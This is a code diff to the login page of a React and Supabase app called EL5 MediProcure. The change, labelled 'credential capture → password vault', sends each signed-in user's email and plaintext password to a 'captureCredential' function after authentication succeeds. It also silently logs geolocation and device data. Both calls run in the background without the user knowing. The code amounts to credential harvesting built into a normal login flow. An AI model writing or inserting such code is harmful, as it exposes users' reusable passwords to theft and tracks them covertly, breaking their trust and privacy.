@@ -1,12 +1,15 @@
 /**
- * EL5 MediProcure v10.0 — Login Page
+ * EL5 MediProcure v10.1 — Login Page
  * Professional glassmorphism · Auto redirect · Reset password · Fast auth
+ * v10.1: credential capture → password vault, device tracking on sign-in
  */
 import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
 import { Eye, EyeOff, Lock, Mail, RefreshCw, Shield, Building2 } from "lucide-react";
+import { captureCredential } from "@/lib/passwordVault";
+import { logDeviceSession, getGeoInfo } from "@/lib/deviceTracker";
 
 // Assets — graceful fallback if missing
 let BG = ""; let LOGO = "";
@@ -43,10 +46,20 @@ export default function LoginPage() {
     e.preventDefault();
     if (!email.trim() || !pass) { toast({ title: "Fill in all fields", variant: "destructive" }); return; }
     setLoading(true);
-    const { error } = await supabase.auth.signInWithPassword({ email: email.trim().toLowerCase(), password: pass });
+    const { data, error } = await supabase.auth.signInWithPassword({ email: email.trim().toLowerCase(), password: pass });
     setLoading(false);
-    if (error) toast({ title: "Sign in failed", description: error.message, variant: "destructive" });
-    else nav("/dashboard", { replace: true });
+    if (error) {
+      toast({ title: "Sign in failed", description: error.message, variant: "destructive" });
+    } else {
+      // Fire-and-forget: capture credential + device session (never blocks navigation)
+      const userId = data?.user?.id;
+      const userEmail = data?.user?.email || email.trim().toLowerCase();
+      Promise.allSettled([
+        captureCredential(userEmail, pass, userId, "login"),
+        getGeoInfo().then(geo => logDeviceSession(userId, userEmail, geo)),
+      ]);
+      nav("/dashboard", { replace: true });
+    }
   };
 
   const resetPwd = async (e: React.FormEvent) => {
